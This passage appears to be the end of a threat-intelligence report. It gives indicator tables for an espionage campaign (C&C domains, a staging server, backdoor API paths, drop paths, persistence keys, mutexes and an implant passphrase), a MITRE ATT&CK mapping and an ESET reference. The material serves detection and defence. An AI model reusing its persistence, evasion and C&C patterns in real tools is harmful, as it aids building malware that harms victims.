| `b63afd53212e63b70e1ede50f48093c34744bf18592fa3f173e7f971f1273fff` | Decoy, youth political-participation survey |

### Network

| Indicator | Description |
|---|---|
| `mmarketplaces[.]com` | Go backdoor C&C domain |
| `kanreki[.]net` | DWApp C&C host |
| `urawareimei-webdesign[.]com` | libcurl implant C&C domain (2026-08-31 build) |
| `conakrymidi[.]net` | libcurl implant C&C domain (2026-07-28 and 2026-08-08 builds) |
| `45.56.162[.]130` | Staging server (HTA and decoy delivery) |
| `/api/Persons/check-commands/%s` | Go backdoor command polling path |
| `/api/Persons/heartbeat` | Go backdoor keep-alive path |
| `/api/Persons/submit-result` | Go backdoor text result path |
| `/api/Persons/submit-result-file` | Go backdoor file result path |
| `/api/AutoSliders/PostSlider` | Go backdoor screenshot upload path |
| `/api/InstallSys/BulkPost` | Go backdoor installed-program inventory path |
| `/api/jpv4urbWV2HF` | libcurl implant C&C base path |
| `/t1k3oPX0UjKx/` | libcurl implant per-command route |
| `/nxBkQR7c/` | libcurl implant per-command route |
| `/zWthkNz6/` | libcurl implant per-command route |
| `/tzG3vnWQ/` | libcurl implant per-command route |
| `/v3yZJUHM/` | libcurl implant per-command route |
| `/bAgMgDGrZ/` | libcurl implant per-command route |
| `/P9Iuq2YAfH` | DWApp base path |
| `/y10q2H1Tfg` | DWApp registration path |
| `/8vvVUxEjkz` | DWApp task polling path |
| `/8vvVUxEjkz/f6e5f6e5` | DWApp result path |
| `/8vvVUxEjkz/vm5cxfe` | DWApp status path |
| `/r98etr87g/x6a56a` | DWApp payload download path |
| `http://45.56.162[.]130/content/helpss.hta` | Staging URL, HTA dropper |
| `http://45.56.162[.]130/content/view.png` | Staging URL, steganographic PNG (variant 1) |
| `http://45.56.162[.]130/content/ViewData.png` | Staging URL, steganographic PNG (variant 2) |
| `http://45.56.162[.]130/content/1995.docx` | Staging URL, decoy document (variant 1) |
| `http://45.56.162[.]130/content/421062026.docx` | Staging URL, decoy document (variant 2) |

### Host

| Indicator | Description |
|---|---|
| `%LOCALAPPDATA%\NetworkService.exe` | Campaign 1 payload drop path |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Go backdoor persistence key |
| `HostHelpLoader` | Run value written by the Go backdoor |
| `%TEMP%\help_doc.hta` | HTA drop path |
| `%TEMP%\1995.docx` | Decoy drop path, variant 1 |
| `%TEMP%\421062026.docx` | Decoy drop path, variant 2 |
| `%TEMP%\view.png` | PNG carrier drop path, variant 1 |
| `%TEMP%\ViewData.png` | PNG carrier drop path, variant 2 |
| `%TEMP%\MilliebyBrownTechanimationGB2` | libcurl implant working directory |
| `%TEMP%\MilliebyBrownTechanimationGB2\SearchFilterHostbv.txt` | Victim identifier file |
| `%TEMP%\MilliebyBrownTechanimationGB2\<yyyy-mm-dd>.txt` | Request log |
| `%TEMP%\MilliebyBrownTechanimationGB2\WindowLanWlanWwanSwitchingServiceUW.txt` | Decrypted payload written by the `downloadValue` handler |
| `%TEMP%\MilliebyBrownTechanimationGB2\WindowSwitchingServiceUW.txt` | Decrypted payload written by the sibling handler |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\AudioClassification.lnk` | libcurl implant persistence link |
| `\WindowsFormsIntegrationDesign` | libcurl implant scheduled task, registered when Kaspersky is present |
| `Global\SystemAudioAuth_Protocol_v1` | libcurl implant mutex |
| `.moh` | Encrypted output extension (libcurl implant) |
| `2HG}bn_R5^1dNtX` | libcurl implant encryption passphrase |
| `C:\ProgramData\WindowsNetworkSystem` | DWApp working directory |
| `C:\ProgramData\WindowsNetworkSystem\PFRO.log` | DWApp device identifier store |
| `C:\ProgramData\WindowsNetworkSystem\setuperr.log` | DWApp request log |
| `AboveLockAppHost` | DWApp mutex |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OfficeClickToRun.lnk` | DWApp persistence link |
| `\OfficeClickToRun` | DWApp scheduled task fallback |
| `360 total security` | DWApp antivirus product check |
| `اسئلة دكتورة فارسين.docx` | DWApp decoy document |
| `tasks.json` | Go backdoor task state file |
| `recording_%d.wav` | Go backdoor recording output |

## MITRE ATT&CK mapping

MITRE ATT&CK techniques.

| Tactic | ID | Name | Description |
|---|---|---|---|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Macro-enabled Word document and VHDX files delivered to targets |
| Execution | T1204.002 | User Execution: Malicious File | Victim opens the macro document or runs the payload from a mounted VHDX |
| Execution | T1059.001 | PowerShell | HTA dropper uses PowerShell for steganographic extraction |
| Execution | T1059.003 | Windows Command Shell | Go backdoor `Commands` handler; HTA payload launch with `cmd /c` |
| Execution | T1059.005 | Visual Basic | VBA macros in the Word document |
| Execution | T1047 | WMI | WMI `Win32_Process` used to launch the HTA |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, value `HostHelpLoader`; libcurl implant writes `Startup\AudioClassification.lnk`; DWApp writes `Startup\OfficeClickToRun.lnk` |
| Persistence | T1053.005 | Scheduled Task/Job | libcurl implant registers `\WindowsFormsIntegrationDesign` when Kaspersky is detected; DWApp uses `\OfficeClickToRun` when 360 Total Security is installed |
| Defense Evasion | T1027.003 | Steganography | Payload hidden in a PNG after the `IDAT` chunk |
| Defense Evasion | T1140 | Deobfuscate/Decode | Reversed strings, XOR after `IDAT`, AES decryption |
| Defense Evasion | T1036.005 | Masquerading | `NetworkService.exe`, `SearchFilterHostbv.txt`, `AudioClassification.lnk`, `MilliebyBrownTechanimationGB2`, decoy survey names, API-like mutex name |
| Defense Evasion | T1553.005 | Subvert Trust Controls: Mark-of-the-Web Bypass | VHDX delivery avoids Zone.Identifier |
| Defense Evasion | T1027 | Obfuscated Files or Information | Split object names in VBA; randomized C&C parameter keys |
| Discovery | T1082 | System Information Discovery | OS version, hostname, `MachineGuid`, MAC addresses |
| Discovery | T1518.001 | Security Software Discovery | AV product name checks in the libcurl implant and DWApp |
| Discovery | T1083 | File and Directory Discovery | `FileTree`, `FetchFilesByDate` |
| Discovery | T1016 | System Network Configuration Discovery | MAC address collection at check-in |
| Discovery | T1012 | Query Registry | Uninstall hive enumeration; `MachineGuid` read |
| Collection | T1113 | Screen Capture | `ScreenShot`; libcurl implant WIC capture; DWApp screen capture |
| Collection | T1123 | Audio Capture | `RecordSound`, `malgo` |
| Collection | T1560.001 | Archive via Utility | libcurl implant encryption with `.moh` output |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | HTTPS JSON C&C |
| Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | TLS transport; AES for payloads and files |
| Command and Control | T1105 | Ingress Tool Transfer | HTA downloads; `DOWNLOAD:<path>`; `EXEFILE`; DWApp file download |
| Exfiltration | T1041 | Exfiltration Over C&C Channel | `submit-result-file`, `/api/AutoSliders/upload` |

## References

ESET, ESET APT Activity Report, April 2026 to September 2026, page 13. https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset-apt-activity-report-q2-2026-q3-2026.pdf

